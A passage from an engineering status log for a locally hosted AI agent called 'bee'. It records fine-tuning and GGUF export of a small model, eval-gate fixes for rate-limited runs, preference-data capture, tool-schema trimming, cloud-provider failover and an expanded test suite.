  → `permission_request` → `POST /permission {grant: true}` → tool executed
  (output = the workspace path), `verify: pass` — the full clean chain, not just
  a card. Regressions added: `tests/test_web_approvals.py` runs a real kernel +
  real guard → card → grant → execute E2E, plus two launcher-ordering tests
  pinning `get_kernel` before `start_automation` for both entry points (the
  approver unit tests could not catch this — they never built the kernel
  through the launchers).
- **`bee4b-v2` is built and serving** — today's SFT run
  (`models/bee-qlora-20261017`, r=16 QLoRA, 2 epochs, 24 steps; train_loss 1.454
  / eval 2.183 vs `bee-qlora-20261016`'s 1.741 / 2.432) merged to
  `models/bee-merged-v2`, converted to f16 GGUF, quantized `Q4_K_M` (1.8 GB)
  with llama.cpp b11711, and imported with
  `ollama create bee4b-v2 -f models/bee4b-v2.Modelfile` (`ollama show`: qwen2
  3.1B, Q4_K_M, **tools** capability). Client-level smoke: `bee4b` and
  `bee4b-v2` both return the exact requested `code_run` tool call. `config.yaml`
  now sets `model_gate.candidate: bee4b-v2`; adoption stays with the J3 gate
  (seeds the active model's baseline, scores the candidate, writes
  `models.yaml local_model` only on a win).
- **J3 gate ran on `bee4b-v2` — verdict VOID, not a loss.** It seeded the
  active model's baseline (`bee4b` 16/21, cloud up), then the candidate arm hit
  the Gemini quota mid-run: `web_search_tool`, `plan_complex` and
  `guard_blocked` failed with `litellm.RateLimitError` (429) minutes after the
  same tasks passed in the baseline arm, so the printed "14/21 < 16/21 + margin
  1" and the "structural regression: guard_blocked" mixed model quality with
  provider availability. On the tasks that actually exercised the local models
  the two arms are within the suite's known ±2–3 stochastic noise (candidate
  gained `file_roundtrip` + `file_list_ws`, lost `dsa_lis`; `dsa_sort_check` /
  `dsa_graph` failed on both). No promotion — `models.yaml` untouched, and the
  quota-poisoned 14/21 candidate record was removed from `evals/baselines.json`
  (the `bee4b` baseline stays). The gate now detects 429-corrupted arms
  (`gate._rate_limited_ids`): a rate-limited candidate voids the comparison with
  an explicit reason and is **not** recorded, and a rate-limited arm is refused
  as a baseline seed — both pinned by two new tests in `tests/test_eval_gate.py`.
  Re-run when the quota recovers (the nightly `model_gate` job retries
  automatically).
- **`training/qlora/merge_export.py` emitted an impossible command** —
  `convert_hf_to_gguf.py --outtype q4_k_m` (llama.cpp accepts only
  `{f32,f16,bf16,q8_0,tq1_0,tq2_0,auto}`; Q4_K_M is a `llama-quantize` step).
  The generator now emits the verified recipe, a Modelfile that deliberately
  carries no hand-written TEMPLATE (the GGUF embeds the training-time
  `tokenizer.chat_template`; overriding it would drift from the SFT
  distribution), and DEPLOY.md steps that end at the J3 gate.
- **The eval suite's workspace restore rolls back concurrent edits by design** —
  `runner._restore_workspace` snapshots the tree's bytes at entry and puts any
  file that changed during the run back "as found" (the A36a design that
  protects pre-existing uncommitted work; its docstring says so). An edit made
  WHILE the suite is in flight is indistinguishable from run debris: live today
  this silently reverted `docs/STATUS.md` mid-gate — this very section had to be
  written twice. The restore now logs what it puts back (`bee.evals` logger,
  with the file list) so the rollback is visible instead of surfacing as a
  mystery missing diff. Operational rule: don't edit tracked files while an eval
  run is in flight — or expect them back as they were at run start.
- **Cloud work now teaches the local model automatically — the teach-back
  capture leak is closed** (`bee/agent/loop.py`, `bee/pipeline/train_router.py`).
  `_golden` fired only on `res.escalated`, but the hybrid speed tier routes
  routine work to cloud and deliberately clears that flag, so cloud-first
  successes never became training material (live ledger: **556** cloud-served
  episodes, **5** goldens — 3 of them test residue per A63). Capture now keys
  on the serving tier (`loop._served_cloud`: escalated, model `cloud`,
  `*:cloud` Ollama models) with the same verify-fail gate, and records the
  user's own wording (the kernel's `route_text`, threaded through
  `_finish(..., raw=said)`) instead of the context-inflated prompt — closing
  TECHNICAL_DEBT A64. Router labels stop asserting service that never happened
  (`train_router.label_row`): cloud-first episodes are skipped as unknown
  instead of labeled "local". Pinned by `tests/test_fastpaths.py`
  (`test_golden_written_for_cloud_first_ok`,
  `test_golden_records_raw_wording_not_context_block`) and three new cases in
  `tests/test_pipeline.py::test_router_label`.
- **The preference corpus is no longer 0-forever (P0-4).** Before today: 0
  ratings, 0 preference pairs — DPO was unreachable by construction. Now
  `memory/ratings.db` has a `pairs` table (`record_pair`/`pairs`, deduped by
  triple hash) with four sources: `critique` rewrites and `verify-fix` drafts
  captured inline in `loop.py` (both were produced and thrown away before),
  plus offline `episode-derive` (`python -m bee.pipeline.derive_prefs`)
  pairing a cloud golden answer against a failed run of the same task (rule A)
  and verifier-fail → verifier-pass runs (rule B). First real yield: **7
  pairs** recorded from the existing ledger (e.g. the exact `= 132.0` result
  and a full GCD/LCM answer preferred over the 3B's "previous calls to the
  calculator…" rambles) → `train/prefs.jsonl` via the now-merged
  `training/dpo/export_prefs.py`, validated end-to-end by
  `train_dpo.py --dry-run` (which correctly refuses below the 10-pair floor;
  pairs accrue from live capture). Derivation is conservative by measured
  necessity: the first dry run offered 24 "pairs" that were all meta-ramble
  preferred over `(stopped: max iterations reached)`; harness sentinels,
  harness-written fallbacks, and error-text goldens are refused as "chosen"
  sides, while meta-ramble stays legal as the rejected side. ORPO note:
  installed TRL 1.16.0 ships no `ORPOTrainer`; with a PEFT adapter
  `ref_model=None` already means "same weights, adapter off" (no second model
  in 4 GB), and `--loss-type` passes TRL's unified preference losses. Pinned
  by `tests/test_pipeline.py`, `tests/test_self_improve.py` (pairs roundtrip,
  export merge) and
  `tests/test_claim_grounding.py::test_a_verify_fix_becomes_a_preference_pair`.
- **The local prompt fits its context window again — tool-schema diet (P0-1).**
  num_ctx 8192 (compaction budget 7168 est tokens) but all 30 schemas weigh
  ~17.1k chars ≈ 6.0k est of it — a live `web_search_tool` turn measured
  **8434 est tokens with NOTHING left to compact** (the A59 log line), i.e. the
  tool list alone starved the history before any result arrived. The local
  route now receives a fitted 20-schema subset
  (`bee/tools/__init__.py:LOCAL_TOOL_NAMES`: files/shell/code_run/calculator,
  memory, skills, planner, web_search/web_fetch, system_health, scheduler)
  ≈ 8.3k chars ≈ 3.2k est floor, measured with a representative system+task
  floor: history headroom **1,129 → 4,002 est tokens** (freed ~2.9k est
  ≈ 9.8k chars). Cloud calls keep the full set and the executor registry is
  unchanged — the dropped capability tools (automate, automation_job,
  systemctl, computer_*, sandbox_run, spawn_task) stay callable, they are just
  no longer advertised on every local turn; `loop.py:tools_for` picks per call,
  so a mid-run de-escalation switches sets with the model. Pinned by
  `tests/test_fastpaths.py` (`test_local_route_gets_the_fitted_schema_subset`,
  `test_cloud_route_keeps_the_full_schema_set`).
- **The cloud quota is a managed resource now — second-provider failover
  (P0-2).** One 429 used to mean "cloud is down for the rest of the day": the
  primary burned its ~20 req/day, every later cloud call re-probed the
  exhausted provider, and the system degraded to local/offline — the
  2026-10-17 J3 gate run died exactly this way (VOID, retry ~9.5 h).
  `cloud.llm` remains the primary; `cloud.fallback_llm` (shipped as
  `zai/glm-5.3-flash`; credentials from `fallback_api_key` or `ZAI_API_KEY` /
  `ZHIPUAI_API_KEY`) is the second provider. On a rate-limit / auth / 5xx
  error the client cools the primary's provider kind for `cloud.quota_cooldown`
  seconds and retries the same call on the fallback with its own credentials
  and base_url (`bee/agent/client.py:_cloud_failover` / `_call_info`; per
  call, so mid-run de-escalation and pre-token streaming failures get it too).
  Later calls skip a cooling provider outright — no latency tax on a
  known-exhausted quota — and the cooldown expires back to the primary. The
  provider registry knows zai (env keys, legacy `zhipuai/` alias, health/
  model_info listing), and `cloud_available` treats a credentialed fallback
  as cloud UP (`fallback-only: …` in the reason), so the hybrid keeps
  escalating instead of silently going local. No cross-provider credential
  leaks (pinned); with no fallback configured the previous behavior is
  preserved exactly. Pinned by the five new cases in `tests/test_providers.py`
  (switch + cooldown + straight-to-fallback, credential refusal, cooldown
  expiry, fallback-only availability, zai keys). The fallback is pre-wired in
  `config.yaml` — activation is one env var: today no ZAI key exists on this
  box, so live 429s still degrade; setting `ZAI_API_KEY` ends the failure
  mode.
- **The nightly loop is CLOSED — train → merge → import → gate → promote
  (P0-5), and the gate now has statistical power.** Until today the chain
  stopped after training: a finished adapter sat in `models/bee-qlora-*`
  until a human hand-ran merge/convert/quantize/`ollama create` and edited
  `model_gate.candidate` in `config.yaml` (exactly the manual day that built
  `bee4b-v2`). Now `maybe_train_qlora`'s success path runs the whole chain
  (`bee/scheduler.py:_auto_chain`): `merge_export.py` merges the adapter
  (torch step, `--skip-merge` on re-runs), `convert_hf_to_gguf.py` → f16
  GGUF, `llama-quantize` → Q4_K_M, `ollama create bee-qlora-<tag>` — each
  physical step gated on an unpacked llama.cpp at `training.llama_cpp_dir`
  (shipped as the b11711 dir used for `bee4b-v2`); without it the chain
  stops with the exact remedy and queues NOTHING (the gate can never be
  pointed at a half-built artifact). A fully imported model is queued in
  `train/gate_candidate.json`, and the J3 gate consumes it (explicit
  argument > queue > `config.yaml` candidate) — one decisive attempt per
  artifact: promote/reject clear the queue, a 429-VOID keeps it for a retry
  (the quota lesson applied to the queue itself), and `/gate show` displays
  both the queue and the rounds. The gate itself no longer flips on flake:
  tasks the two arms DISAGREE on are re-run `model_gate.adjudication_rounds`
  extra times per side (default 2) and a majority decides — at n=21 a single
  flaky task used to flip a verdict either way (the live run sat inside the
  suite's ±2-3 stochastic noise); 0 restores the old single-shot comparison.
  Pinned by eight new tests: six in `tests/test_eval_gate.py` (queue pickup
  + consume on reject/promote, queue survives a VOID, an explicit candidate
  never consumes another's queue entry, flaky-verdict flip with only
  disagreements re-run, zero-rounds single-shot) and two in
  `tests/test_sft.py` (chain stops cleanly without llama.cpp and queues
  nothing; full merge→convert→quantize→create→queue order). Verified live
  on the real config: `training.llama_cpp_dir` resolves to the unpacked
  b11711 dir, `adjudication_rounds: 2`, queue empty.

New in the 2026-10-17 **P1 pass** (first items of the delivered roadmap's
`P1 — next month` tier):

- **Plan-first execution (P1-1).** The planner ran only when the user asked
  for a plan, post-hoc (the A45b rescue: if the final answer dropped the plan,
  call the planner *after the fact* and append its steps). Multi-step tasks
  executed with no plan in context, and plan-only requests depended on the 3B
  remembering to call the tool. Now `run_agent` runs the planner tool BEFORE
  the loop when the kernel's `classify_intent` says `multi_step` or the
  request asks for a plan (`bee/agent/loop.py`, `plan_text`/`plan_tool_calls`),
  and injects the steps into the working context with intent-appropriate
  wording — execution requests are told to follow them, plan requests to
  *present* them ("Do NOT execute": a live probe showed the 3B starts running a
  plan-only task once handed steps). Gated on `learning.plan_first`
  (operator switch, default on), a real `LLMClient` (scripted test doubles see
  an untouched call sequence — same rule as critique/reflection), local server
  up, and the cancel event; planner failure degrades to the old behavior and
  never blocks; deterministic/fastpath tiers return before it. Verified live
  twice against the real model (probe found and fixed the execute-nudge;
  probe 2: plan presented, no execution, `verify: pass`). Pinned by six tests
  in `tests/test_kernel_integration.py`.
- **SFT/inference parity (P1-2).** Training rows were user-first with no
  system prompt and no tool surface, while inference carries the canonical
  system prompt + fitted tool subset (~8k est tokens) — the local model was
  fine-tuned on a frame it never sees at serving time. `build_sft` now
  prefixes every emitted row with `canonical_system_prompt()`
  (`bee/agent/context.py`): the same structure — PERSONA, the act-don't-refuse
  environment rules, the who-I-serve block, and the tool surface the local
  route advertises (names + one-line descriptions from the P0-1 20-tool
  subset) — with context-independent content and `loss=False` (never trained
  on). The full JSON schemas are deliberately NOT inlined: measured 8,330 chars
  ≈ 2.1k tokens for the subset alone against seq 2048/4096 training; the call
  FORMAT is already taught by the tool-call examples. `--no-parity` /
  `parity=False` restores the old contract for ablations. `train.py` no longer
  tail-truncates: samples longer than `--seq` are SKIPPED and counted
  (truncation cut the supervised answer and trained on prompt geometry), the
  dry run estimates over-seq from the corpus, and the summary reports how many
  rows carry the system prompt. Live on the real corpus: **87/87 rows
  parity-prefixed**; at seq 4096 9 samples over budget, at 2048 21 — both
  reported by the trainer, neither silently mangled. Pinned by
  `tests/test_pipeline.py` (prefix + ablation + live/canonical sync with a
  size bound) and the updated `tests/test_sft.py` golden-row contract.
- **Eval expansion 21 → 66 + CI-grade runner (P1-3).** The 21-task suite was
  too thin to gate the stack: a regression outside those fixed ids measured as
  "no effect". `evals/tasks.yaml` now carries 66 tasks — the legacy 21 plus 45
  chosen per stack layer: 11 fastpath text, 7 fastpath exec, 3 fastpath-BLOCK
  (destructive payloads the fastpath must refuse), 10 deterministic
  arithmetic, 5 LLM, 5 guard (destructive shell/python/code_run refusals),
  2 memory, 2 plan. The runner (`bee/evals/runner.py`) reports a Wilson 95%
  CI per run, flags repeat-disagreeing tasks as `flaky`, and the repeat loop
  now runs every rep and requires all to pass (`reps_passed/reps_total`).
  Fastpath-block tasks would pass vacuously under pinned-model (gate) runs —
  the fastpath tier is bypassed there by design — so they carry
  `skip_if: "pinned_model"`: skipped in gate/pinned runs, scored live in
  interactive ones. Guard-task wording was earned empirically: a phrasing
  sampler (6 templates × 3 runs) confirmed the survivors, the shutdown task
  moved to the 3/3 `"Use the shell to run the command '…'"` template, and
  `guard_sandbox_rmtree` was dropped (bee4b prose-refused 3/3 — nothing to
  assert). Verified live: interactive full-stack run **31/31** (trio blocked,
  zero tools), pinned run **6/6 + 1 expected skip**; offline probes green
  (66 unique ids, no route hijacks). Pinned by `tests/test_eval_score.py`
  (skip_if semantics, CI/flaky shapes) and `tests/test_fastpaths.py` (real-
  classifier fastpath guard, 3 payloads).

---
*Every row above is traceable to the evidence column of the acceptance audit
or to a green test in the 1020-test suite (`pytest tests -q`, re-measured
2026-10-18). Nothing here is marketing.*
